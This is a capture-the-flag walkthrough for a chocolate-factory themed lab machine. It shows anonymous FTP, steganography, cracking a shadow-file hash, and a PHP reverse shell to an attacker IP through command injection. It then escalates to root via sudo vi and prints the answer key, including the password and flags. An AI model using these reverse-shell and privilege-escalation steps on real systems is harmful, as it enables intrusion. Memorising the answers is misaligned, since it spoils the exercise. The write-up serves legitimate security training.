---
A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!
---
### rustscan

> found port 21 ftp, port 22 ssh, port 80 http and more

### ftp

```anonymous
ftp 10.10.10.71
```

>Connected to 10.10.10.71.
220 (vsFTPd 3.0.3)
Name (10.10.10.71:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21456|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
229 Entering Extended Passive Mode (|||52109|)
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
100% |**************************************|   203 KiB  115.47 KiB/s    00:00 ETA
226 Transfer complete.
208838 bytes received in 00:02 (95.84 KiB/s)
ftp> exit
221 Goodbye.

### steghide

```blank
steghide extract -sf gum_room.jpg 
```

```
cat b64.txt | base64 -d
```

>daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::

### john

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=sha512crypt
```
==cn7824           (charlie) ==
### gobuster

```
gobuster dir --url http://10.10.10.71 -w /usr/share/wordlists/dirb/common.txt -t 60 -k -x py,html,txt,php,tar,zip,old,bak
```

> /home.php             (Status: 200) [Size: 569]

>we got command injection on this page

```
php -r '$sock=fsockopen("10.18.1.00",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

`kali machine`

```
rlwrap nc -nlvp 4444
```
```
script -qc /bin/bash /dev/null
```
```
strings key_rev_key
```
>Enter your name: 
laksdhfas
 congratulations you have found the key:   
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
 Keep its safe

```
cat validate.php
```
`if($uname=="charlie" && $password=="cn7824")`

```
cat teleport
```

> copy id_rsa to kali machine

```
nano charlie_key
```
```
chmod 600 charlie_key
```

### ssh

```
ssh -i charlie_key charlie@10.10.10.71 
```

```
cat /home/charlie/user.txt
```

### priv esc

```
sudo -l
```

==(ALL : !root) NOPASSWD: /usr/bin/vi==

```gtfobins
sudo vi -c ':!/bin/sh' /dev/null
```

```
cd /root
```

```key
python root.py
```

`enter key found`

>print(mess)# python root.py
Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
__   __               _               _   _                 _____ _          



- Enter the key you found!*b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='*
- What is Charlie's password?*cn7824*
- change user to charlie *No answer needed*
- Enter the user flag*flag{cd5509042371b34e4826e4838b522d2e}*
- Enter the root flag*flag{cec59161d338fef787fcb4e296b42124}*





